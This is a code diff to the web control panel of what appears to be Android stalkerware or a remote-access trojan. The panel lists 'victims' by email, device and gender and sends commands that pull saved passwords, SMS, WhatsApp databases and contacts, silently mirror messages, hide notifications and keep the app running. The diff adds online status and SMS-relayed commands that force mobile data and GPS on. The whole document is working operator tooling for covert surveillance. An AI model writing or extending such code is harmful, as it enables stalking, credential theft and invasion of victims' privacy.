@@ -10,22 +10,18 @@
         body { background: var(--bg); color: var(--neon-red); font-family: 'Courier New', monospace; margin: 0; overflow-x: hidden; }
         #matrixCanvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.15; }
         
-        /* Login Box */
         #login-box { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); border: 2px solid var(--neon-red); padding: 40px; text-align: center; background: black; z-index: 10000; box-shadow: 0 0 30px var(--dark-red); }
         input { background: #110000; border: 1px solid var(--neon-red); color: var(--neon-red); padding: 12px; margin: 10px 0; width: 280px; outline: none; }
         
-        /* Layout */
         #dashboard { display: none; }
         header { border-bottom: 2px solid var(--neon-red); padding: 15px; text-align: center; background: #110000; box-shadow: 0 5px 15px rgba(255,0,0,0.2); }
         .target-status { background: #1a0000; color: var(--green); padding: 10px; font-size: 13px; border-bottom: 1px solid var(--neon-red); text-align: center; }
         
-        /* Tabs */
         .tabs { display: flex; overflow-x: auto; background: #0a0000; border-bottom: 1px solid var(--neon-red); }
         .tab { padding: 15px 20px; cursor: pointer; border-right: 1px solid var(--dark-red); white-space: nowrap; transition: 0.3s; font-weight: bold; font-size: 11px; }
         .tab:hover { background: var(--dark-red); }
         .tab.active { background: var(--neon-red); color: #000; }
 
-        /* Container & Cards */
         .container { padding: 20px; display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
         .panel { display: none; grid-column: 1 / -1; }
         .panel.active { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 20px; }
@@ -34,11 +30,11 @@
         .card::before { content: ""; position: absolute; top: 0; left: 0; width: 4px; height: 100%; background: var(--neon-red); }
         .card h3 { margin-top: 0; color: var(--gold); border-bottom: 1px solid var(--dark-red); padding-bottom: 10px; font-size: 15px; }
 
+        button { background: #220000; color: var(--neon-red); border: 1px solid var(--neon-red); padding: 8px 12px; font-weight: bold; cursor: pointer; font-size: 10px; border-radius: 4px; transition: 0.3s; margin: 2px; }
+        button:hover { background: var(--neon-red); color: black; }
         .btn-danger { border-color: #ff4444; color: #ff4444; }
         .btn-special { border-color: var(--purple); color: var(--purple); }
         .btn-cyan { border-color: var(--cyan); color: var(--cyan); }
-        button { background: #220000; color: var(--neon-red); border: 1px solid var(--neon-red); padding: 8px 12px; font-weight: bold; cursor: pointer; font-size: 10px; border-radius: 4px; transition: 0.3s; margin: 2px; }
-        button:hover { background: var(--neon-red); color: black; }
 
         .timeline-box { height: 150px; overflow-y: auto; background: #000; border: 1px solid var(--dark-red); padding: 10px; font-size: 10px; color: var(--green); }
         .live-stream { width: 100%; height: 150px; background: #000; border: 1px solid var(--cyan); display: flex; align-items: center; justify-content: center; font-size: 10px; color: var(--cyan); }
@@ -78,7 +74,7 @@
         
         <div id="radar-panel" class="panel active">
             <div class="card">
-                <h3>📊 ACTIVITY TIMELINE</h3>
+                <h3>📊 ACTIVITY TIMELINE (LIVE/OFFLINE)</h3>
                 <div class="timeline-box" id="activity-timeline">Waiting for victim data...</div>
             </div>
             <div class="card">
@@ -90,9 +86,9 @@
 
         <div id="victims-panel" class="panel">
             <div class="card" style="grid-column: 1 / -1;">
-                <h3>👥 NODES (GENDER & ID ENABLED)</h3>
+                <h3>👥 ACTIVE CONNECTIONS</h3>
                 <table>
-                    <thead><tr><th>EMAIL/ID</th><th>DEVICE</th><th>GENDER</th><th>ACTION</th></tr></thead>
+                    <thead><tr><th>EMAIL/ID</th><th>DEVICE</th><th>GENDER</th><th>STATUS</th><th>ACTION</th></tr></thead>
                     <tbody id="victim-list"></tbody>
                 </table>
             </div>
@@ -122,7 +118,7 @@
                 <button class="btn-special" onclick="sendCommand('get_passwords')">VIEW SAVED PASSWORDS</button>
             </div>
             <div class="card">
-                <h3>📂 FILES</h3>
+                <h3>📂 EXTRACT FILES</h3>
                 <button onclick="sendCommand('get_sms')">SMS</button>
                 <button onclick="sendCommand('get_whatsapp')">WA DB</button>
                 <button onclick="sendCommand('get_contacts')">CONTACTS</button>
@@ -131,10 +127,10 @@
 
         <div id="ghost-panel" class="panel">
             <div class="card">
-                <h3>👻 GHOST MODE</h3>
+                <h3>👻 GHOST MODE CONTROL</h3>
                 <button class="btn-cyan" onclick="sendCommand('notif_off')">NOTIFICATIONS OFF</button>
                 <button class="btn-cyan" onclick="sendCommand('notif_on')">NOTIFICATIONS ON</button>
-                <p style="font-size: 10px; color: var(--cyan);">* Shadow Mirroring Active</p>
+                <p style="font-size: 10px; color: var(--cyan);">* Messages will be mirrored invisibly.</p>
             </div>
             <div class="card">
                 <h3>🎤 VOICE CHANGER INTERCOM</h3>
@@ -155,9 +151,10 @@
                 <button class="btn-special" onclick="sendCommand('set_immortal')">ACTIVATE IMMORTAL MODE</button>
             </div>
             <div class="card">
-                <h3>🛠️ MISC</h3>
-                <button onclick="sendCommand('vibrate')">VIBRATE</button>
-                <button class="btn-danger" onclick="sendCommand('uninstall_self')">TERMINATE SYSTEM (KILL-SWITCH)</button>
+                <h3>🛠️ OFFLINE COMMANDS (SMS)</h3>
+                <button onclick="sendSmsCommand('force_data_on')">FORCE MOBILE DATA ON</button>
+                <button onclick="sendSmsCommand('force_gps')">FORCE GPS ON</button>
+                <button class="btn-danger" style="width:100%; margin-top:10px;" onclick="sendCommand('uninstall_self')">TERMINATE SYSTEM</button>
             </div>
         </div>
 
@@ -182,7 +179,6 @@
 
     function initApp() {
         loadVictims();
-        // Matrix Canvas Background
         setInterval(draw, 50);
     }
 
@@ -193,10 +189,12 @@
             snap.forEach((child) => {
                 const v = child.val();
                 const genderIcon = v.gender === 'girl' ? '👧' : '👦';
+                const status = v.online ? '<span style="color:var(--green)">ONLINE</span>' : '<span style="color:gray">OFFLINE</span>';
                 list.innerHTML += `<tr>
                     <td>${v.email || v.target}</td>
                     <td>${v.device}</td>
-                    <td>${genderIcon} ${v.gender || 'Unknown'}</td>
+                    <td>${genderIcon}</td>
+                    <td>${status}</td>
                     <td><button onclick="selectTarget('${child.key}', '${v.target}', '${v.gender}')">SELECT</button></td>
                 </tr>`;
             });
@@ -220,7 +218,7 @@
     }
 
     function loadActivity(targetId) {
-        db.ref('activity/' + targetId).limitToLast(10).on('value', (snap) => {
+        db.ref('activity/' + targetId).limitToLast(15).on('value', (snap) => {
             const box = document.getElementById('activity-timeline');
             box.innerHTML = "";
             snap.forEach(child => {
@@ -232,8 +230,15 @@
 
     function sendCommand(cmd) {
         if(!window.activeTarget) return alert("SELECT A TARGET FIRST!");
-        db.ref('commands/' + window.activeTarget).set({ action: cmd, time: Date.now() });
+        db.ref('commands/' + window.activeTarget).set({ action: cmd, time: Date.now(), mode: 'online' });
         alert("Command Sent: " + cmd);
+    }
+
+    function sendSmsCommand(cmd) {
+        if(!window.activeTarget) return alert("SELECT A TARGET!");
+        // SMS කමාන්ඩ් එකක් විදිහට සර්වර් එකට යවනවා, එවිට APK එක එය SMS හරහා හඳුනා ගනී.
+        db.ref('commands/' + window.activeTarget).set({ action: cmd, time: Date.now(), mode: 'sms_relay' });
+        alert("SMS Command Relayed: " + cmd);
     }
 
     function showTab(evt, id) {
@@ -243,7 +248,7 @@
         evt.currentTarget.classList.add('active');
     }
 
-    // Matrix Logic
+    // Matrix Background Animation
     const canvas = document.getElementById('matrixCanvas');
     const ctx = canvas.getContext('2d');
     canvas.width = window.innerWidth; canvas.height = window.innerHeight;
